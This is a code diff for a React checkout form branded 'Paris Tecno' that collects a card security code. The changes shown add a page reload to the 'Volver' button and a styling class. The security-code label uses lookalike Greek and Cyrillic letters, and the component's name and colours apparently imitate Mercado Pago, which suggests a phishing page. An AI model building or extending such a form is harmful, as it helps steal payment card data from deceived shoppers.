@@ -13,6 +13,10 @@ const Mp = ({ formData }) => {
       const [input4Value, setInputValue4] = useState('');
       const [loading, setLoading] = useState('');
 
+      const handleClick = () => {
+        // Recarga la página cuando se hace clic en el botón
+        window.location.reload();
+    };
 
       const handleInput1Change = (event) => {
         let value = event.target.value;
@@ -127,7 +131,7 @@ Paris Tecno <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 
               Códigο de seguridаd
               </label>
               <input
-                className="appearance-none border-2 rounded w-full py-3 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline"
+                className="appearance-none text-sm border-2 rounded w-full py-3 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline"
                 id="input5"
                 type="text"
                 placeholder="123"
@@ -153,7 +157,7 @@ Paris Tecno <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 
           </form>
           </div>
        <button  className="bg-[#009EE3] hover:bg-[#007de3e0] text-white font-bold py-3 px-4 rounded w-full mt-5" onClick={mostrarErrorHandler} style={estilo} >Continuar</button>
-       <button  className="bg-slate-300 hover:bg-slate-300 text-[#009EE3] font-bold py-3 px-4 rounded w-full mt-1 mb-[40px]" style={estilo} >Volver</button>
+       <button  className="bg-slate-300 hover:bg-slate-300 text-[#009EE3] font-bold py-3 px-4 rounded w-full mt-1 mb-[40px]" onClick={handleClick} style={estilo} >Volver</button>
       </div>
     </div>
     </div>
